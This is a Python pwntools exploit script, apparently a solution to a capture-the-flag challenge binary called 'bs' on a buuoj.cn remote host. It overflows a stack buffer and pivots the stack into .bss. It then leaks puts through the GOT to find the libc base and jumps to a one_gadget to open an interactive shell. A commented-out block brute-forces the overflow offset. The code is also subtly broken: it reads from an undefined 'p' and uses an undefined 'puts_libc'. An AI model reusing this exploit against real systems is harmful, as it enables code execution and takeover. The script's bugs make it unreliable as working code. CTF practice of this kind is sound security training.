from pwn import *
context.log_level = 'debug'

"""
offset = 0x1020 + 8
count = 1
while True:
    print count
    io = process('./bs')
    io.recvuntil("How many bytes do you want to send?")
    io.sendline(str(offset))
    ret_addr = 0x4009E7
    payload  = 'a'*0x1010
    payload += p64(0xdeadbeef)
    payload += p64(ret_addr)
    payload += 'a'*(offset-len(payload))
    io.send(payload)
    temp = io.recvall()
    if "Welcome" in temp:
        io.close()
        break
    else:
        offset += 8
        count += 1
        io.close()
"""
def exp():
    offset = 0x2000
    #io = process('./bs')
    io = remote('node4.buuoj.cn', 26773)
    elf = ELF('./bs')
    libc = elf.libc

    fakerbp = elf.bss() + 0x300
    ret_addr = 0x4009E7
    pop_rdi_ret = 0x400C03
    pop_rsi_r15_ret = 0x400C01
    leave_ret = 0x400955

    payload  = '\x00'*0x1010
    payload += p64(fakerbp)
    #leak libc
    payload += p64(pop_rdi_ret)
    payload += p64(elf.got['puts'])
    payload += p64(elf.symbols['puts'])
    #read one_gadget to bss
    payload += p64(pop_rdi_ret)
    payload += p64(0)
    payload += p64(pop_rsi_r15_ret)
    payload += p64(fakerbp)
    payload += p64(0)
    payload += p64(elf.symbols['read'])
    payload += p64(leave_ret)
    payload  = payload.ljust(offset, '\x00')
    
    io.recvuntil("How many bytes do you want to send?\n")
    io.sendline(str(offset))
    sleep(0.01)
    io.send(payload)
    
    io.recvuntil("It's time to say goodbye.\n")
    puts_addr = u64(p.recv()[:6].ljust(8,'\x00'))
    
    print hex(puts_addr)
    getshell_libc = 0xf03a4
    base_addr = puts_addr - puts_libc
    one_gadget = base_addr + getshell_libc

    payload  = p64(0xdeadbeef)
    payload += p64(one_gadget)
    io.send(payload)
    
    io.interactive()

if __name__ == '__main__':
    exp()

